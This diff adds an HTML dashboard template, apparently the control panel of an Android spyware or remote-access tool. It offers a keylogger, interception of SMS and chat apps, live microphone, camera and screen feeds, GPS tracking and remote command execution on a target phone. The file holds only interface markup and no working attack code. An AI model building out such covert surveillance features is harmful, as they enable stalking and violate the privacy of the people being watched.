@@ -1,0 +1,281 @@
+
+  <!-- Main Content -->
+ <div class="main-content fade-in">
+
+ <div class="index">
+
+  <div class="header d-flex justify-content-between align-items-center margin">
+    <div>
+      <h5>Device: <span class="text-info">Oppo K1</span></h5>
+      <h6>
+        Status: <span id="deviceStatus" class="status-green online">Executing..</span> |
+        Battery: <span id="batteryLevel" class="text-warning">--%</span> |
+        Last Seen: <span id="lastSeen" class="status-green">Executing..</span> |
+      </h6>
+    </div>
+  </div>
+
+ </div>
+
+   <div class="container dashboard">
+      <!-- Dashboard Section -->
+      <fieldset class="dash-fieldset">
+        <legend>Dashboard</legend>
+        <div class="row g-4">
+
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-wifi"></i> Device Status</div>
+              <p>Monitor signal strength and connectivity.</p>
+              <button class="btn btn-outline-info btn-sm">Ping</button>
+            </div>
+          </div>
+
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-battery-three-quarters"></i> Battery Info</div>
+              <p>Check battery level and charging state.</p>
+              <button class="btn btn-outline-info btn-sm">Refresh</button>
+            </div>
+          </div>
+
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-sms"></i> SMS Logs</div>
+              <p>View sent and received SMS messages.</p>
+             <button class="btn btn-outline-info btn-sm" onclick="dashboard('sms')" id="smsBtn">Open</button>
+            </div>
+          </div>
+
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-phone"></i> Call Logs</div>
+              <p>View incoming and outgoing call history.</p>
+              <button id="btnCallLogs" class="btn btn-outline-info btn-sm">Open</button>
+            </div>
+          </div>
+
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-calendar-alt"></i> Contact Log</div>
+              <p>Access contacts name and number.</p>
+              <button id="btnContacts" onclick="dashboard('contact')" class="btn btn-outline-primary btn-sm">View Contact</button>
+            </div>
+          </div>
+
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-chart-bar"></i> Statistics</div>
+              <p>Analyze usage and interaction stats.</p>
+              <button class="btn btn-outline-info btn-sm " id="statisticBtn">Open</button>
+            </div>
+          </div>
+
+        </div>
+      </fieldset>
+
+      <!--Middle feature-->
+      <fieldset class="dash-fieldset">
+        <legend>General</legend>
+        <div class="row g-4">
+
+          
+
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-image"></i> Gallery</div>
+              <p>View and download images/videos.</p>
+              <button class="btn btn-outline-success btn-sm">Open Gallery</button>
+            </div>
+          </div>
+
+           <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-keyboard"></i> Keylogger</div>
+              <p>Log and track keyboard input.</p>
+              <button class="btn btn-outline-danger btn-sm">View Logs</button>
+            </div>
+          </div>
+
+           <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-folder-open"></i> File Explorer</div>
+              <p>Browse all files on the device.</p>
+              <button class="btn btn-outline-secondary btn-sm">Browse Files</button>
+            </div>
+          </div>
+
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-camera-retro"></i> Screenshot</div>
+              <p>Take and view screenshots remotely.</p>
+              <button class="btn btn-outline-info btn-sm">Capture</button>
+            </div>
+          </div>
+
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-globe"></i> Site Web</div>
+              <p>Monitor web activity & history.</p>
+              <button class="btn btn-outline-info btn-sm">View</button>
+            </div>
+          </div>
+
+          <div class="col-md-4">
+      <div class="card fade-in">
+        <div class="card-title"><i class="fas fa-map-marked-alt"></i> Travel History</div>
+        <p>View previous travel routes of the device using location history.</p>
+        <button class="btn btn-outline-warning btn-sm">Show Routes</button>
+      </div>
+    </div>
+
+        </div>
+      </fieldset >
+
+      <!-- Other Features Section -->
+      <fieldset class="dash-fieldset">
+        <legend>Other Features</legend>
+        <div class="row g-4">
+
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-history"></i> Clipboard History</div>
+              <p>Track and view recent copied content on device.</p>
+              <button class="btn btn-outline-light btn-sm">View Clipboard</button>
+            </div>
+          </div>
+         
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-bell-slash"></i> Do Not Disturb</div>
+              <p>Remotely enable/disable DND or silent mode.</p>
+              <button class="btn btn-outline-danger btn-sm">Toggle DND</button>
+            </div>
+          </div>
+
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-user-clock"></i> App Scheduler</div>
+                <p>Schedule apps to run or auto-close at set times.</p>
+                <button class="btn btn-outline-warning btn-sm">Set Schedule</button>
+              </div>
+          </div>
+
+           <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-folder-open"></i> Installed app</div>
+              <p>Browse all files on the device.</p>
+              <button class="btn btn-outline-secondary btn-sm" id="btnInstalledApps">Installed app</button>
+            </div>
+          </div>
+
+      </div>
+    </fieldset>
+
+      <!-- Advanced Intelligence Features -->
+<fieldset class="dash-fieldset">
+  <legend>Advanced Intelligence</legend>
+  <div class="row g-4">
+
+    <div class="col-md-4">
+      <div class="card fade-in">
+        <div class="card-title"><i class="fas fa-robot"></i> App Usage Monitor</div>
+        <p>Track which apps are being used in real-time and duration.</p>
+        <button class="btn btn-outline-info btn-sm">Monitor Apps</button>
+      </div>
+    </div>
+
+    <div class="col-md-4">
+      <div class="card fade-in">
+        <div class="card-title"><i class="fas fa-envelope-open-text"></i> Instant Messaging</div>
+        <p>Read WhatsApp, Messenger, Telegram (root/permission-based).</p>
+        <button class="btn btn-outline-success btn-sm">Read Chats</button>
+      </div>
+    </div>
+    
+
+    <div class="col-md-4">
+      <div class="card fade-in">
+        <div class="card-title"><i class="fas fa-route"></i> Geo-Fencing</div>
+        <p>Get alerts when device exits or enters a location.</p>
+        <button class="btn btn-outline-info btn-sm">Set Fence</button>
+      </div>
+    </div>
+
+    <div class="col-md-4">
+      <div class="card fade-in">
+        <div class="card-title"><i class="fas fa-bullhorn"></i> Alert Broadcast</div>
+        <p>Push voice/sound alerts to the device remotely.</p>
+        <button class="btn btn-outline-success btn-sm">Send Alert</button>
+      </div>
+    </div>
+
+    <div class="col-md-4">
+      <div class="card fade-in">
+        <div class="card-title"><i class="fas fa-shield-alt"></i> App Lock</div>
+        <p>Lock apps like gallery or messaging remotely.</p>
+        <button class="btn btn-outline-info btn-sm">Manage Locks</button>
+      </div>
+    </div>
+
+    
+    
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-map-marker-alt"></i> Location</div>
+              <p>Live GPS tracking and location history.</p>
+              <button id="trackLocation" onclick="dashboard('location')" class="btn btn-outline-info btn-sm">Track</button>
+            </div>
+          </div>
+
+    
+
+          <div class="col-md-4">
+           <div class="card fade-in">
+             <div class="card-title"><i class="fas fa-microphone"></i> Microphone</div>
+             <p>Stream or record live audio.</p>
+             <button class="btn btn-outline-warning btn-sm">Start Mic</button>
+            </div>
+          </div>
+
+           <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-camera"></i> Camera Access</div>
+              <p>Capture images or start live video.</p>
+              <button class="btn btn-outline-danger btn-sm">Access Camera</button>
+            </div>
+          </div>
+
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-terminal"></i> Remote Commands</div>
+              <p>Execute terminal/ADB commands.</p>
+              <button onclick="dashboard('remote-command')" class="btn btn-outline-light btn-sm">Send Command</button>
+            </div>
+          </div>
+
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fas fa-desktop"></i> Live Screen Monitoring</div>
+              <p>Monitor the device screen live.</p>
+              <button class="btn btn-outline-primary btn-sm">Start Stream</button>
+            </div>
+          </div>
+
+          <div class="col-md-4">
+            <div class="card fade-in">
+              <div class="card-title"><i class="fa-solid fa-spider"></i> Spyder</div>
+              <p>Remote trap</p>
+              <button class="btn btn-outline-danger btn-sm">Cast-Net</button>
+            </div>
+          </div>
+
+        </div>
+
+  </div>
+</fieldset>
+
+
+    </div>
+  
+
